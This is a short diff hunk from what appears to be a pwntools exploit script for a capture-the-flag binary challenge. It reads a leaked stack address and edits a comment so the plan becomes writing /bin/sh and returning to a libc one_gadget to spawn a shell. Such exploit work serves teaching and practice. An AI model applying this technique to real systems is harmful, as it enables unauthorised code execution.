@@ -106,7 +106,7 @@ offset = 0x1ff38
 stack_leak = int(io.recv(12), 16)
 info(f'stack leak: {hex(stack_leak)}')
 
-# write /bin/sh and overwrite got entry
+# write /bin/sh and ret to a one_gadget
 
 """
 libc
